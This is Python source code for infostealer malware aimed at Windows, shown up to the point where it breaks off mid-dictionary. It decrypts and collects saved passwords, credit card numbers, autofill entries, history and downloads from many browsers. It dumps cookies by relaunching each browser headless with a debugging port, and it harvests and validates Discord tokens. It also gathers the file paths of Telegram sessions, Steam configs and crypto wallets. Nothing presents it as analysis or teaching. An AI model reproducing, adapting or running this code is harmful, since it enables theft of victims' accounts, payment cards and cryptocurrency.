import base64
import json
import os
import re
import shutil
import sqlite3
import subprocess
import time
import threading
import socket
import platform
import getpass
import requests
import json
from pathlib import Path
from zipfile import ZipFile
from concurrent.futures import ThreadPoolExecutor
from tempfile import gettempdir
import requests
from websocket import create_connection

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

# Global variables to store extracted data
LOGINS = []
COOKIES = []
WEB_HISTORY = []
DOWNLOADS = []
CARDS = []
TOKENS = []
AUTOFILL = []

DEBUG_PORT_BASE = 9222
debug_port_counter = 0
debug_port_lock = threading.Lock()

def get_next_debug_port():
    global debug_port_counter
    with debug_port_lock:
        port = DEBUG_PORT_BASE + debug_port_counter
        debug_port_counter += 1
        return port

def get_master_key(path):
    """Get the master key for decrypting browser data"""
    try:
        if not os.path.exists(path):
            return None

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return None

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # Remove DPAPI prefix
        try:
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"[!] Error decrypting master key: {e}")
            # Try alternative decryption method
            try:
                from win32crypt import CryptProtectData
                master_key = CryptProtectData(master_key, None, None, None, None, 0)[1]
                return master_key
            except Exception as e2:
                print(f"[!] Alternative decryption also failed: {e2}")
                return None
    except Exception as e:
        print(f"[!] Error getting master key: {e}")
        return None

def decrypt_password(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def get_login_data(path, profile, master_key, browser_name):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        print(f"[!] Login database not found for {browser_name} profile {profile}: {login_db}")
        return

    try:
        login_db_copy = os.path.join(gettempdir(), f'login_db_{browser_name}_{profile}')
        shutil.copy(login_db, login_db_copy)
        
        conn = sqlite3.connect(login_db_copy)
        cursor = conn.cursor()
        
        # Try to get login data
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        rows = cursor.fetchall()
        
        if not rows:
            print(f"[!] No login data found for {browser_name} profile {profile}")
            return
            
        for row in rows:
            if not row[0] or not row[1] or not row[2]:
                continue

            try:
                password = decrypt_password(row[2], master_key)
                LOGINS.append({
                    'url': row[0],
                    'username': row[1],
                    'password': password,
                    'browser': browser_name
                })
            except Exception as e:
                print(f"[!] Error decrypting password for {browser_name}: {e}")
                continue

        print(f"[+] Successfully extracted {len(rows)} logins from {browser_name} profile {profile}")
        
    except Exception as e:
        print(f"[!] Error extracting login data from {browser_name} profile {profile}: {e}")
    finally:
        try:
            conn.close()
            os.remove(login_db_copy)
        except:
            pass

def get_autofill_data(path, profile, browser_name):
    autofill_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(autofill_db):
        return

    autofill_db_copy = os.path.join(gettempdir(), 'autofill_db')
    shutil.copy(autofill_db, autofill_db_copy)
    conn = sqlite3.connect(autofill_db_copy)
    cursor = conn.cursor()
    
    # Fetch autofill data (name, email, phone, etc.)
    cursor.execute('SELECT name, value FROM autofill WHERE name LIKE "name%" OR name LIKE "email%" OR name LIKE "phone%" OR name LIKE "address%"')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue

        # Add autofill data to the global collection
        AUTOFILL.append({
            'field': row[0],
            'value': row[1],
            'browser': browser_name  # Add browser name
        })

    conn.close()
    os.remove(autofill_db_copy)


def get_cookies_via_devtools(browser_name, path, profile, exe_paths):
    debug_port = get_next_debug_port()
    debug_url = f'http://localhost:{debug_port}/json'
    
    print(f"[*] Attempting to extract cookies from {browser_name} profile {profile}")
    
    # Find a path to the executable
    program_files = os.getenv('PROGRAMFILES')
    program_files_x86 = os.getenv('PROGRAMFILES(X86)')
    possible_exe_locations = [
        os.path.join(program_files, browser_name, 'Application', exe_paths[browser_name]),
        os.path.join(program_files_x86, browser_name, 'Application', exe_paths[browser_name])
    ]
    
    # For special cases
    if browser_name == 'google-chrome':
        possible_exe_locations.append(os.path.join(program_files, 'Google', 'Chrome', 'Application', 'chrome.exe'))
        possible_exe_locations.append(os.path.join(program_files_x86, 'Google', 'Chrome', 'Application', 'chrome.exe'))
    elif browser_name == 'microsoft-edge':
        possible_exe_locations.append(os.path.join(program_files, 'Microsoft', 'Edge', 'Application', 'msedge.exe'))
        possible_exe_locations.append(os.path.join(program_files_x86, 'Microsoft', 'Edge', 'Application', 'msedge.exe'))
    elif browser_name == 'brave':
        possible_exe_locations.append(os.path.join(program_files, 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'))
        possible_exe_locations.append(os.path.join(program_files_x86, 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'))
    elif browser_name == 'opera':
        possible_exe_locations.append(os.path.join(program_files, 'Opera', 'launcher.exe'))
        possible_exe_locations.append(os.path.join(program_files_x86, 'Opera', 'launcher.exe'))
    elif browser_name == 'operagx':
        possible_exe_locations.append(os.path.join(program_files, 'Opera GX', 'launcher.exe'))
        possible_exe_locations.append(os.path.join(program_files_x86, 'Opera GX', 'launcher.exe'))
    
    exe_path = None
    for loc in possible_exe_locations:
        if os.path.exists(loc):
            exe_path = loc
            print(f"[+] Found browser executable at: {loc}")
            break
    
    if not exe_path:
        print(f"[!] Could not find browser executable for {browser_name}")
        return
    
    try:
        # Kill any existing browser instances
        executable = os.path.basename(exe_path)
        print(f"[*] Killing existing {executable} processes")
        subprocess.run(f'taskkill /F /IM {executable}', check=False, shell=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Start browser in debugging mode with the specific profile
        print(f"[*] Starting {browser_name} in debug mode")
        subprocess.Popen([exe_path, 
                         f'--remote-debugging-port={debug_port}',
                         '--remote-allow-origins=*',
                         '--headless',
                         f'--user-data-dir={path}',
                         f'--profile-directory={profile}'],
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL)
        
        # Wait for browser to initialize
        time.sleep(2)
        
        # Connect to debugging interface
        ws_url = None
        for _ in range(10):
            try:
                res = requests.get(debug_url)
                data = res.json()
                ws_url = data[0]['webSocketDebuggerUrl'].strip()
                print(f"[+] Connected to debug interface at {ws_url}")
                break
            except (requests.exceptions.ConnectionError, IndexError, json.JSONDecodeError):
                time.sleep(0.5)
                
        if not ws_url:
            print(f"[!] Failed to connect to debug interface for {browser_name}")
            return
            
        # Extract cookies via DevTools Protocol
        ws = create_connection(ws_url)
        ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
        response = json.loads(ws.recv())
        cookies = response['result']['cookies']
        ws.close()
        
        print(f"[+] Extracted {len(cookies)} cookies from {browser_name}")
        
        # Add cookies to our collection - using Netscape format structure
        for cookie in cookies:
            domain = cookie['domain']
            if not domain.startswith('.'):
                domain = '.' + domain
            
            secure = "TRUE" if cookie.get('secure', False) else "FALSE"
            http_only = "TRUE" if cookie.get('httpOnly', False) else "FALSE"
            
            # Store in a format that can be easily converted to Netscape format
            COOKIES.append({
                'domain': domain,
                'flag': "TRUE" if domain.startswith('.') else "FALSE",
                'path': cookie.get('path', '/'),
                'secure': secure,
                'expiry': str(int(cookie.get('expires', 0))),
                'name': cookie.get('name', ''),
                'value': cookie.get('value', ''),
                'browser': browser_name
            })
            
    except Exception as e:
        print(f"[!] Error extracting cookies from {browser_name}: {e}")
    finally:
        # Always kill browser when done
        if exe_path:
            try:
                executable = os.path.basename(exe_path)
                print(f"[*] Cleaning up {executable} process")
                subprocess.run(f'taskkill /F /IM {executable}', check=False, shell=True,
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as e:
                print(f"[!] Error cleaning up browser process: {e}")

def get_web_history(path, profile, browser_name):
    """Extract web history from browser databases"""
    print(f"[*] Attempting to extract history from {browser_name} profile {profile}")
    
    # Define possible history database locations
    history_paths = [
        f'{path}\\{profile}\\History',  # Standard Chromium path
        f'{path}\\{profile}\\History-journal',  # Journal file
        f'{path}\\{profile}\\History-wal',  # Write-ahead log
        f'{path}\\History',  # Opera path
        f'{path}\\History-journal',  # Opera journal
        f'{path}\\History-wal'  # Opera WAL
    ]
    
    # Find the first existing history database
    history_db = None
    for db_path in history_paths:
        if os.path.exists(db_path):
            history_db = db_path
            print(f"[+] Found history database at: {db_path}")
            break
    
    if not history_db:
        print(f"[!] No history database found for {browser_name} profile {profile}")
        return

    try:
        # Create a unique temporary copy of the database
        temp_dir = gettempdir()
        history_db_copy = os.path.join(temp_dir, f'history_db_{browser_name}_{profile}_{int(time.time())}')
        print(f"[*] Creating temporary copy at: {history_db_copy}")
        
        # Copy the database file
        shutil.copy2(history_db, history_db_copy)
        
        # Connect to the database
        conn = sqlite3.connect(history_db_copy)
        conn.row_factory = sqlite3.Row  # Enable column access by name
        cursor = conn.cursor()
        
        # Try different SQL queries based on browser type
        queries = [
            "SELECT url, title, last_visit_time FROM urls",  # Standard Chromium
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC",  # Alternative
            "SELECT url, title, visit_time FROM urls",  # Some browsers
            "SELECT url, title, last_visit_time FROM urls WHERE url IS NOT NULL"  # With NULL check
        ]
        
        history_data = []
        for query in queries:
            try:
                cursor.execute(query)
                rows = cursor.fetchall()
                if rows:
                    print(f"[+] Found {len(rows)} history entries using query: {query}")
                    history_data = rows
                    break
            except sqlite3.Error as e:
                print(f"[!] Query failed: {e}")
                continue
        
        if not history_data:
            print(f"[!] No history data found in database for {browser_name}")
            return
        
        # Process the history entries
        for row in history_data:
            try:
                url = row['url'] if 'url' in row.keys() else row[0]
                title = row['title'] if 'title' in row.keys() else row[1]
                timestamp = row['last_visit_time'] if 'last_visit_time' in row.keys() else row[2]
                
                if not url or not title or not timestamp:
                    continue
                
                # Convert timestamp if needed (Chromium uses microseconds since 1601)
                if isinstance(timestamp, (int, float)) and timestamp > 10000000000000000:
                    # Convert from microseconds to seconds
                    timestamp = timestamp / 1000000
                    # Convert from 1601 to 1970 epoch
                    timestamp = timestamp - 11644473600
                
                WEB_HISTORY.append({
                    'url': url,
                    'title': title,
                    'timestamp': timestamp,
                    'browser': browser_name
                })
            except Exception as e:
                print(f"[!] Error processing history entry: {e}")
                continue
        
        print(f"[+] Successfully extracted {len(WEB_HISTORY)} history entries from {browser_name}")
        
    except Exception as e:
        print(f"[!] Error extracting history from {browser_name}: {e}")
        import traceback
        print(f"[!] Traceback: {traceback.format_exc()}")
        
    finally:
        # Cleanup
        try:
            if 'cursor' in locals():
                cursor.close()
            if 'conn' in locals():
                conn.close()
            if os.path.exists(history_db_copy):
                os.remove(history_db_copy)
                print(f"[*] Cleaned up temporary database copy")
        except Exception as e:
            print(f"[!] Error during cleanup: {e}")

def get_downloads(path, profile, browser_name):
    downloads_db = f'{path}\\{profile}\\History'
    if not os.path.exists(downloads_db):
        print(f"[!] Downloads database not found for {browser_name} profile {profile}: {downloads_db}")
        return

    try:
        downloads_db_copy = os.path.join(gettempdir(), f'downloads_db_{browser_name}_{profile}')
        shutil.copy(downloads_db, downloads_db_copy)
        
        conn = sqlite3.connect(downloads_db_copy)
        cursor = conn.cursor()
        
        # Try to get downloads data
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        rows = cursor.fetchall()
        
        if not rows:
            print(f"[!] No downloads data found for {browser_name} profile {profile}")
            return
            
        for row in rows:
            if not row[0] or not row[1]:
                continue

            DOWNLOADS.append({
                'tab_url': row[0],
                'target_path': row[1],
                'browser': browser_name
            })

        print(f"[+] Successfully extracted {len(rows)} downloads from {browser_name} profile {profile}")
        
    except Exception as e:
        print(f"[!] Error extracting downloads from {browser_name} profile {profile}: {e}")
    finally:
        try:
            cursor.close()
            conn.close()
            os.remove(downloads_db_copy)
        except:
            pass

def get_credit_cards(path, profile, master_key, browser_name):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        print(f"[!] Credit cards database not found for {browser_name} profile {profile}: {cards_db}")
        return

    try:
        cards_db_copy = os.path.join(gettempdir(), f'cards_db_{browser_name}_{profile}')
        shutil.copy(cards_db, cards_db_copy)
        
        conn = sqlite3.connect(cards_db_copy)
        cursor = conn.cursor()
        
        # Try to get credit card data
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        rows = cursor.fetchall()
        
        if not rows:
            print(f"[!] No credit card data found for {browser_name} profile {profile}")
            return
            
        for row in rows:
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            try:
                card_number = decrypt_password(row[3], master_key)
                CARDS.append({
                    'name': row[0],
                    'month': row[1],
                    'year': row[2],
                    'number': card_number,
                    'date_modified': row[4],
                    'browser': browser_name
                })
            except Exception as e:
                print(f"[!] Error decrypting card number for {browser_name}: {e}")
                continue

        print(f"[+] Successfully extracted {len(rows)} credit cards from {browser_name} profile {profile}")
        
    except Exception as e:
        print(f"[!] Error extracting credit cards from {browser_name} profile {profile}: {e}")
    finally:
        try:
            cursor.close()
            conn.close()
            os.remove(cards_db_copy)
        except:
            pass

def extract_chromium_data():
    appdata = os.getenv('LOCALAPPDATA')
    browsers = {
        'amigo': appdata + '\\Amigo\\User Data',
        'torch': appdata + '\\Torch\\User Data',
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
    }
    
    exe_paths = {
        'amigo': 'amigo.exe',
        'torch': 'torch.exe',
        'kometa': 'kometa.exe',
        'orbitum': 'orbitum.exe',
        'cent-browser': 'chrome.exe',
        '7star': '7star.exe',
        'sputnik': 'sputnik.exe',
        'vivaldi': 'vivaldi.exe',
        'google-chrome-sxs': 'chrome.exe',
        'google-chrome': 'chrome.exe',
        'epic-privacy-browser': 'epic.exe',
        'microsoft-edge': 'msedge.exe',
        'uran': 'uran.exe',
        'yandex': 'browser.exe',
        'brave': 'brave.exe',
        'iridium': 'iridium.exe',
    }
    
    profiles = [
        'Default',
        'Profile 1',
        'Profile 2',
        'Profile 3',
        'Profile 4',
        'Profile 5',
    ]

    for browser_name, path in browsers.items():
        if not os.path.exists(path):
            continue

        master_key = get_master_key(f'{path}\\Local State')
        if not master_key:
            continue
        
        for profile in profiles:
            if not os.path.exists(path + '\\' + profile):
                continue
            
            operations = [
                (get_login_data, (path, profile, master_key, browser_name)),  # Pass browser_name
                (get_web_history, (path, profile, browser_name)),  # Pass browser_name
                (get_downloads, (path, profile, browser_name)),  # Pass browser_name
                (get_credit_cards, (path, profile, master_key, browser_name)),  # Pass browser_name
                (get_autofill_data, (path, profile, browser_name))  # Added autofill extraction
            ]

            for operation, args in operations:
                try:
                    operation(*args)
                except Exception as e:
                    pass
            
            try:
                get_cookies_via_devtools(browser_name, path, profile, exe_paths)
            except Exception as e:
                pass

def extract_opera_data():
    roaming = os.getenv("APPDATA")
    paths = {
        'operagx': roaming + '\\Opera Software\\Opera GX Stable',
        'opera': roaming + '\\Opera Software\\Opera Stable'
    }
    
    exe_paths = {
        'operagx': 'launcher.exe',
        'opera': 'launcher.exe'
    }

    for browser_name, path in paths.items():
        if not os.path.exists(path):
            continue

        master_key = get_master_key(f'{path}\\Local State')
        if not master_key:
            continue

        operations = [
            (get_login_data, (path, "", master_key, browser_name)),  # Pass browser_name
            (get_web_history, (path, "", browser_name)),  # Pass browser_name
            (get_downloads, (path, "", browser_name)),  # Pass browser_name
            (get_credit_cards, (path, "", master_key, browser_name)),  # Pass browser_name
            (get_autofill_data, (path, "", browser_name))  # Added autofill extraction
        ]

        for operation, args in operations:
            try:
                operation(*args)
            except Exception as e:
                pass
                
        # Use DevTools method for cookies extraction
        try:
            get_cookies_via_devtools(browser_name, path, "", exe_paths)
        except Exception as e:
            pass

def extract_discord_tokens():
    base_url = "https://discord.com/api/v9/users/@me"
    appdata = os.getenv("localappdata")
    roaming = os.getenv("appdata")
    regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

    uids = []

    paths = {
        'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
        'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
        'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
        'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
        'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
        'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
        'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
        'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
        'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
        'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
    }

    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        
        _discord = name.replace(" ", "").lower()
        
        if "cord" in path:
            if not os.path.exists(roaming+f'\\{_discord}\\Local State'):
                continue
                
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                    
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(regexp_enc, line):
                        token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), 
                                               get_master_key(roaming+f'\\{_discord}\\Local State'))
                        
                        try:
                            if validate_token(token, base_url):
                                uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
                                if uid not in uids:
                                    TOKENS.append(token)
                                    uids.append(uid)
                        except Exception:
                            pass
        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                    
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(regexp, line):
                        try:
                            if validate_token(token, base_url):
                                uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
                                if uid not in uids:
                                    TOKENS.append(token)
                                    uids.append(uid)
                        except Exception:
                            pass

    if os.path.exists(roaming+"\\Mozilla\\Firefox\\Profiles"):
        for path, _, files in os.walk(roaming+"\\Mozilla\\Firefox\\Profiles"):
            for _file in files:
                if not _file.endswith('.sqlite'):
                    continue
                    
                for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(regexp, line):
                        try:
                            if validate_token(token, base_url):
                                uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
                                if uid not in uids:
                                    TOKENS.append(token)
                                    uids.append(uid)
                        except Exception:
                            pass

def validate_token(token, base_url):
    r = requests.get(base_url, headers={'Authorization': token})
    return r.status_code == 200

def format_tokens_data():
    formatted_tokens = []
    
    for token in TOKENS:
        try:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            
            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user.get('email', 'None')
            phone = user.get('phone', 'None')
            
            formatted_tokens.append(f"Token: {token}\nUser: {username} ({user_id})\nEmail: {email}\nPhone: {phone}\n")
        except Exception:
            formatted_tokens.append(f"Token: {token}\nFailed to get user data\n")
            
    return formatted_tokens

def write_cookies_to_netscape_format(cookies, file_path):
    """Write cookies to a file in Netscape format."""
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("# switch made this bitch\n\n")
        
        for cookie in cookies:
            # Format: domain FLAG path secure expiry name value
            line = f"{cookie['domain']}\t{cookie['flag']}\t{cookie['path']}\t{cookie['secure']}\t{cookie['expiry']}\t{cookie['name']}\t{cookie['value']}\n"
            f.write(line)

def write_logins_to_file(logins, file_path):
    """Write logins to a file."""
    with open(file_path, "w", encoding="utf-8") as f:
        for login in logins:
            f.write(f"URL: {login['url']}\n")
            f.write(f"Username: {login['username']}\n")
            f.write(f"Password: {login['password']}\n\n")

def write_cards_to_file(cards, file_path):
    """Write credit cards to a file."""
    with open(file_path, "w", encoding="utf-8") as f:
        for card in cards:
            f.write(f"Name: {card['name']}\n")
            f.write(f"Number: {card['number']}\n")
            f.write(f"Expiry: {card['month']}/{card['year']}\n\n")

def write_history_to_file(history, file_path):
    """Write web history to a file."""
    with open(file_path, "w", encoding="utf-8") as f:
        for entry in history:
            f.write(f"URL: {entry['url']}\n")
            f.write(f"Title: {entry['title']}\n")
            f.write(f"Timestamp: {entry['timestamp']}\n\n")

def write_downloads_to_file(downloads, file_path):
    """Write downloads to a file."""
    with open(file_path, "w", encoding="utf-8") as f:
        for download in downloads:
            f.write(f"URL: {download['tab_url']}\n")
            f.write(f"Path: {download['target_path']}\n\n")

def write_autofill_to_file(autofill, file_path):
    """Write autofill data to a file."""
    with open(file_path, "w", encoding="utf-8") as f:
        for entry in autofill:
            f.write(f"Field: {entry['field']}\n")
            f.write(f"Value: {entry['value']}\n")
            f.write(f"Browser: {entry['browser']}\n\n")

def getGaming():
    """Extract gaming and messaging app data"""
    gaming_data = {}
    roaming = os.getenv("APPDATA")
    program_files_x86 = os.getenv("PROGRAMFILES(X86)")
    
    # Telegram data
    telegram_path = roaming + "\\Telegram Desktop\\tdata"
    if os.path.exists(telegram_path):
        gaming_data['telegram'] = {
            'path': telegram_path,
            'files': []
        }
        
        # List all files in the tdata directory that contain important session data
        important_patterns = ['map', 'settings', 'key_', 'dc_', 'account', 'user_', 'config', 'session']
        
        for file in os.listdir(telegram_path):
            file_path = os.path.join(telegram_path, file)
            if os.path.isfile(file_path):
                for pattern in important_patterns:
                    if pattern in file.lower() and file_path not in gaming_data['telegram']['files']:
                        gaming_data['telegram']['files'].append(file_path)
                        break
    
    # Steam config
    steam_config_path = os.path.join(program_files_x86, "Steam", "config")
    if os.path.exists(steam_config_path):
        gaming_data['steam'] = {
            'path': steam_config_path,
            'files': []
        }
        
        # Walk through the config directory and get all files
        for root, _, files in os.walk(steam_config_path):
            for file in files:
                file_path = os.path.join(root, file)
                gaming_data['steam']['files'].append(file_path)
    
    return gaming_data

def getCryptoWallets():
    """Extract cryptocurrency wallet data"""
    wallet_data = {}
    roaming = os.getenv("APPDATA")
    
    wallet_locations = {
        'atomic': os.path.join(roaming, "atomic", "Local Storage", "leveldb"),
        'guarda': os.path.join(roaming, "Guarda", "Local Storage", "leveldb"),
        'zcash': os.path.join(roaming, "Zcash"),
        'armory': os.path.join(roaming, "Armory"),
        'bytecoin': os.path.join(roaming, "bytecoin"),
        'exodus': os.path.join(roaming, "Exodus", "exodus.wallet"),
        'binance': os.path.join(roaming, "Binance", "Local Storage", "leveldb"),
        'coinomi': os.path.join(roaming, "Coinomi", "Coinomi", "wallets")
    }
    
    for wallet_name, wallet_path in wallet_locations.items():
        if os.path.exists(wallet_path):
            wallet_data[wallet_name] = {
                'path': wallet_path,
                'files': []
            }
            
            if os.path.isfile(wallet_path):
                # For single files like exodus.wallet
                wallet_data[wallet_name]['files'].append(wallet_path)
            else:
                # For directories
                for root, _, files in os.walk(wallet_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        wallet_data[wallet_name]['files'].append(file_path)
    
    return wallet_data

def getWeb3():
    """Extract Web3 wallet data from Chromium-based browsers"""
    web3_data = {}
    appdata = os.getenv('LOCALAPPDATA')
    
    # Define the target extensions
    target_extensions = {
        "nkbihfbeogaeaoehlefnkodbefgpgknn": "Metamask",
        "ejbalbakoplchlghecdalmeeeajnimhm": "Metamask",
        "fhbohimaelbohpjbbldcngcnapndodjp": "Binance",
        "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
        "fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin",
        "egjidjbpglichdcondbcbdnbeeppgdph": "Trust",
        "ojggmchlghnjlapmfbnjholfjkiidbch": "Venom",
        "opcgpfmipidbgpenhmajoajpbobppdil": "Sui",
        "efbglgofoippbgcjepnhiblaibcnclgk": "Martian",
        "ibnejdfjmmkpcnlpebklmnkoeoihofec": "Tron",
        "ejjladinnckdgjemekebdpeokbikhfci": "Petra",
        "phkbamefinggmakgklpkljjmgibohnba": "Pontem",
        "ebfidpplhabeedpnhjnobghokpiioolj": "Fewcha",
        "afbcbjpbpfadlkmhmclhkeeodmamcflc": "Math",
        "aeachknmefphepccionboohckonoeemg": "Coin98",
        "bhghoamapcdpbohphigoooaddinpkbai": "Authenticator",
        "aholpfdialjgjfhomihkjbmgjidlcdno": "ExodusWeb3",
        "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
        "agoakfejjabomempkjlepdflaleeobhb": "Core",
        "mfgccjchihfkkindfppnaooecgfneiii": "Tokenpocket",
        "lgmpcpglpngdoalbgeoldeajfclnhafa": "Safepal",
        "bhhhlbepdkbapadjdnnojkbgioiodbic": "Solfare",
        "jblndlipeogpafnldhgmapagcccfchpi": "Kaikas",
        "kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
        "ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi",
        "hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
        "cjelfplplebdjjenllpjcblmjkfcffne": "Jaxx Liberty",
        "amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
        "fhilaheimglignddkjgofkcbgekhenbh": "Oxygen",
        "nlbmnnijcnlegkjjpcfjclmcfggfefdm": "MEWCX",
        "nanjmdknhkinifnkgdcggcfnhdaammmj": "Guild",
        "nkddgncdjgjfcddamfgcmfnlhccnimig": "Saturn",
        "aiifbnbfobpmeekipheeijimdpnlpgpp": "TerraStation",
        "fnnegphlobjdpkhecapkijjdkgcjhkib": "HarmonyOutdated",
        "cgeeodpfagjceefieflmdfphplkenlfk": "Ever",
        "pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain",
        "mgffkfbidihjpoaomajlbgchddlicgpn": "PaliWallet",
        "aodkkagnadcbobfpggfnjeongemjbjca": "BoltX",
        "kpfopkelmapcoipemfendmdcghnegimn": "Liquality",
        "hmeobnfnfcmdkdcmlblgagmfpfboieaf": "XDEFI",
        "lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
        "dngmlblcodfobpdpecaadgfbcggfjfnm": "MaiarDEFI",
        "ookjlbkiijinhpmnjffcofjonbfbgaoc": "TempleTezos",
        "eigblbgjknlfbajkfhopmcojidlgcehm": "XMR.PT"
    }
    
    # List of Chromium-based browsers to check
    browsers = {
        'amigo': appdata + '\\Amigo\\User Data',
        'torch': appdata + '\\Torch\\User Data',
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
